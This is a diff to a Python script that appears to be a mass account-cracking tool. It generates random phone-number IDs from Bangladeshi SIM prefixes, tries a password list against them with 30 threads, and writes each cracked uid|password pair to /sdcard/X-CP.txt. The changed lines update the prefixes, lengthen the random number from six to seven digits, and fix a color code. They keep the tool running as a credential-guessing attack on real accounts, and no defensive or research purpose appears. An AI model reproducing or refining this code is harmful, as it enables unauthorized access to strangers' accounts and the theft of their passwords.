@@ -88,7 +88,7 @@ def bhootxx():
 #--------------------- [ RNDM ] -------------------#
 def rndmx():
     x()
-    print('[+] BD SIM CODE : 09256,09259,09452,09779 ');xnxx()
+    print('[+] BD SIM CODE : 0925,0945,0977,0997 ');xnxx()
     dog = input('[?] CODE : ')
     x()
     try:
@@ -97,7 +97,7 @@ def rndmx():
     except ValueError:
             limit = 5000
     for nmbr in range(limit):
-            xxx = ''.join(random.choice(string.digits) for _ in range(6))
+            xxx = ''.join(random.choice(string.digits) for _ in range(7))
             jan.append(xxx)
     with tred(max_workers=30) as tanox:
             x()
@@ -203,7 +203,7 @@ def sexx(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\033[38;5m196m[+] [BHOOT-CP] '+str(uid)+' \_/ '+pas+'\033[1;37m')
+                                        print(f'\r\r\033[38;5;196m[+] [BHOOT-CP] '+str(uid)+' \_/ '+pas+'\033[1;37m')
                                         open('/sdcard/X-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
